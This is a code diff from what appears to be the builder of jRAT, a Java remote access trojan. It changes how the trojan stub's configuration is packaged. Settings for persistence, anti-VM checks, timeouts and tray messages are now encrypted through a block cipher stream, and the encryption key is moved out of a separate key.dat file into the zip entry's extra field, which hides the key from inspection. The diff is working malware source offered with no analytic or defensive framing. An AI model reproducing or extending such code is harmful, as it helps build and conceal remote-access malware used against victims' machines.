@@ -1,10 +1,13 @@
 package se.jrat.client.build;
 
+import java.io.BufferedWriter;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Map;
@@ -15,6 +18,8 @@ import java.util.zip.ZipException;
 import java.util.zip.ZipFile;
 import java.util.zip.ZipOutputStream;
 
+import javax.crypto.Cipher;
+import javax.crypto.CipherOutputStream;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 
@@ -33,7 +38,7 @@ import se.jrat.client.ui.dialogs.DialogSummary;
 import se.jrat.client.utils.ZkmUtils;
 import se.jrat.common.codec.Base64;
 import se.jrat.common.codec.Hex;
-import se.jrat.common.crypto.Crypto;
+import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.common.hash.Md5;
 import se.jrat.common.hash.Sha1;
 import se.jrat.common.utils.DataUnits;
@@ -123,8 +128,10 @@ public class Build {
 			}
 
 			try {
-				entry = new ZipEntry("config.dat");
-				outputStub.putNextEntry(entry);
+				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey);
+				ByteArrayOutputStream baos = new ByteArrayOutputStream();
+				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
+				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));
 
 				Map<String, Object> config = new HashMap<String, Object>();
 
@@ -138,34 +145,36 @@ public class Build {
 				config.put("os", OSConfig.generateString(osconfig));
 				config.put("timeout", timeout);
 				config.put("toms", timeoutms);
-				config.put("ti", trayicon);
 				config.put("error", handleerr);
 				config.put("per", persistance);
 				config.put("perms", persistancems);
 				config.put("debugmsg", debugmsg);
 				config.put("vm", antivm);
-
+				config.put("ti", trayicon);
+				
 				if (trayicon) {
 					config.put("tititle", "");
 					config.put("timsg", traymsg);
 					config.put("timsgfail", traymsgfail);
 					config.put("tititle", traytitle);
-				}
-				
-				int configSize = 0;
+				}			
 				
 				for (String str : config.keySet()) {
-					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key);
-					configSize += enc.length;
+					writer.write(str + "=" + config.get(str));
+					writer.newLine();
 				}
-
-				listener.reportProgress(30, "Writing config (" + configSize + " bytes)" , BuildStatus.INFO);
 				
-				for (String str : config.keySet()) {
-					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key);
-					outputStub.write(enc);
-				}
+				
+				writer.close();
+				
+				listener.reportProgress(30, "Writing config (" + baos.toByteArray().length + " bytes)" , BuildStatus.INFO);		
 
+				entry = new ZipEntry("config.dat");
+				outputStub.putNextEntry(entry);
+				entry.setExtra(key);
+				
+				outputStub.write(baos.toByteArray());
+				
 				outputStub.closeEntry();
 			} catch (Exception ex) {
 				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
@@ -188,19 +197,6 @@ public class Build {
 				outputStub.putNextEntry(entry);
 				copy(trayIcon, outputStub);
 				outputStub.closeEntry();
-			}
-
-			try {
-				entry = new ZipEntry("key.dat");
-				outputStub.putNextEntry(entry);
-				outputStub.write(key);
-				outputStub.closeEntry();
-			} catch (Exception ex) {
-				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
-					listener.reportProgress(30, "Skipped key.dat, already exists.", BuildStatus.ERROR);
-				} else {
-					throw ex;
-				}
 			}
 
 			String[] plugins = null;
